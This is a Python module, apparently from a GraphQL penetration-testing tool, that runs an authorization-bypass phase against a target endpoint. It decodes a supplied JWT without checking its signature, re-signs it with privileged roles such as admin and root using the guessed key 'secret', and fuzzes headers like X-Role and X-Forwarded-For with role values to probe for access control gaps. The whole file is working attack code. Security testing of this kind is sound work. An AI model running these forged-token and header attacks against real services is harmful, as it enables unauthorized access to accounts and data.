# core/auth_tester.py

import requests
import jwt

common_headers = [
    "X-Forwarded-For", "X-Real-IP", "X-User", "X-Role", "X-Auth-Token", "Authorization"
]

test_roles = ["admin", "moderator", "superuser", "staff", "root", "manager"]

def send_auth_request(endpoint, headers):
    query = {"query": "{ __typename }"}
    try:
        r = requests.post(endpoint, json=query, headers=headers, timeout=10)
        return r.status_code, r.text[:300]
    except Exception as e:
        return 0, str(e)

def test_auth_bypass(base_url, endpoint, args):
    print("\n=== [Phase 5] Authorization Bypass Testing ===\n")

    if args.token:
        print(f"[*] Using token: {args.token[:30]}...")
        headers = {"Authorization": f"Bearer {args.token}"}
        code, body = send_auth_request(endpoint, headers)
        print(f"[+] Original Token → Status: {code}\nResponse Snippet:\n{body}\n")

        try:
            decoded = jwt.decode(args.token, options={"verify_signature": False})
            print("[*] Decoded Token:", decoded)

            # Role tampering
            if args.test_roles:
                print("[*] Testing Token Role Tampering...")
                for role in test_roles:
                    tampered = dict(decoded)
                    tampered["role"] = role
                    forged = jwt.encode(tampered, "secret", algorithm="HS256")
                    headers = {"Authorization": f"Bearer {forged}"}
                    code, body = send_auth_request(endpoint, headers)
                    print(f"  [Role: {role}] → {code} | {body[:80]}")

        except Exception as e:
            print("[-] JWT decode failed:", e)

    # Header fuzzing
    if args.header_fuzz:
        print("\n[*] Testing Authorization Header Fuzzing...")
        for header in common_headers:
            for role in test_roles:
                headers = {
                    header: role,
                    "Content-Type": "application/json"
                }
                code, body = send_auth_request(endpoint, headers)
                print(f"  [{header}={role}] → {code} | {body[:80]}")
